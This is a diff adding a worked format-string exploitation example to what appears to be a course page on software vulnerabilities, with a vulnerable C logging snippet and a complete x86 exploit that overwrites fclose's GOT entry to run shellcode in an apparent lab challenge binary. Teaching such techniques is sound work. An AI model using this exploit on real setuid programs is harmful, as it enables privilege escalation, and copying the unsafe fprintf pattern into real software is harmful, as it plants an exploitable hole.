@@ -111,6 +111,61 @@ Y = 0xbd - len(address) - len(pad)
 <img src="/static/course/postgraduate/engineering/fmt.png"  alt=""/>
 </div>
 
+Example (x86):
+1. Exploitable Code:
+```c
+  FILE *f = NULL;
+  char log_entry[64];
+
+  f = fopen("/var/sudolog", "a+");
+  if (f == NULL) {
+    fprintf(stderr, "Can't open sudolog file\n");
+    return -1;
+  }
+  snprintf(log_entry, 64, "1001: %s\n", command);
+  
+  fprintf(f, log_entry);
+  fclose(f);
+```
+
+2. Exploit Code:
+```c
+#define VULN "/var/challenge/level8/8"
+
+extern char shellcode[];
+
+// Hijack fclose() in .rel.plt
+// Relocation section '.rel.plt' at offset 0x3bc contains 11 entries:
+// Offset     Info    Type            Sym.Value  Sym. Name
+// 0804a010  00000207 R_386_JUMP_SLOT   00000000   fclose@GLIBC_2.1
+// shellcode address: 0xbfffffbd
+int main(int argc, char *argv[]) {
+
+    char fmt[] = "aa"                // pad
+                                     // address: inserted value
+                 "\x10\xa0\x04\x08"  // 0804a010: bd
+                 "\x11\xa0\x04\x08"  // 0804a011: ff
+                 "\x12\xa0\x04\x08"  // 0804a012: ff
+                 "\x13\xa0\x04\x08"  // 0804a013: bf
+                 "%166u%68$n"  // 0xbd(expected value) - 
+                                    16(address len) - 
+                                    2(pad) - 
+                                    6(additional chars in snprintf())
+                 "%66u%69$n"   // 0xff - 0xbd (prev len)
+                 "%256u%70$n"  // 0xff - 0xff
+                 "%192u%71$n"; // 0x100 + 0xbf - 0xff (0xbf < 0xff)
+    char *invoke[] = {VULN, fmt, NULL};
+    char *env[] = {shellcode, NULL};
+
+    unsigned int addr = 0xc0000000 - 8 - strlen(VULN) - 1 - strlen(shellcode) - 1;
+    printf("Using address %08x\n", addr);
+
+    execve(invoke[0], invoke, env);
+
+    return 0;
+}
+```
+
 # Other Vulnerabilities
 ## Array Overflow
 User controlled index and value:
